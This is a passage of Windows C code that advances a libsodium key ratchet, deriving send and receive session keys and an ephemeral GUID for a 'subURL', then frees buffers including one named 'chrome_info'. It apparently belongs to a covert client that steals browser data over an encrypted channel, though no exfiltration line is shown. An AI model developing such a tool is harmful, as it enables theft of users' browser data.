            
            // Increase Rachet
            {
                if (derive_nonce_kdf_session(key_kdf_guid, crypto_kx_SESSIONKEYBYTES, 
                                            suburl_bin, crypto_aead_chacha20poly1305_NPUBBYTES, 
                                            key_kdf_guid, crypto_kx_SESSIONKEYBYTES, 
                                            client_guid_ephemeral, crypto_kx_SESSIONKEYBYTES) != ERROR_SUCCESS) {
                    debug_printf("[-] Can't generate guid_ephmeral subURL and guid_kdf key\n");
                    return ERROR_GEN_FAILURE;
                }
                if (derive_nonce_kdf_session(key_kdf_send, crypto_kx_SESSIONKEYBYTES, 
                                            nonce_send, crypto_aead_chacha20poly1305_NPUBBYTES, 
                                            key_kdf_send, crypto_kx_SESSIONKEYBYTES, 
                                            session_key_send, crypto_kx_SESSIONKEYBYTES) != ERROR_SUCCESS) {
                    debug_printf("[-] Can't generate send Session key\n");
                    return ERROR_GEN_FAILURE;
                }
                if (derive_nonce_kdf_session(key_kdf_rcv, crypto_kx_SESSIONKEYBYTES, 
                                            nonce_rcv, crypto_aead_chacha20poly1305_NPUBBYTES, 
                                            key_kdf_rcv, crypto_kx_SESSIONKEYBYTES, 
                                            session_key_rcv, crypto_kx_SESSIONKEYBYTES) != ERROR_SUCCESS) {
                    debug_printf("[-] Can't generate rcv Session key\n");
                    return ERROR_GEN_FAILURE;
                }
                sodium_bin2base64(client_guid_ephemeral_b64, sizeof(client_guid_ephemeral_b64), 
                                    client_guid_ephemeral, crypto_kx_SESSIONKEYBYTES, 
                                    sodium_base64_VARIANT_ORIGINAL);
            }
            
            unMapFile(&fileTarget);
            HeapFree(GetProcessHeap(), 0, ciphertext);
            HeapFree(GetProcessHeap(), 0, message_encrypt_large);
            HeapFree(GetProcessHeap(), 0, buffer_serialize);
            HeapFree(GetProcessHeap(), 0, chrome_info);
            HeapFree(GetProcessHeap(), 0, key);
            HeapFree(GetProcessHeap(), 0, filePath);
            return ERROR_SUCCESS;
        }

        default:
            return ERROR_SUCCESS;
    }
    return ERROR_SUCCESS;
}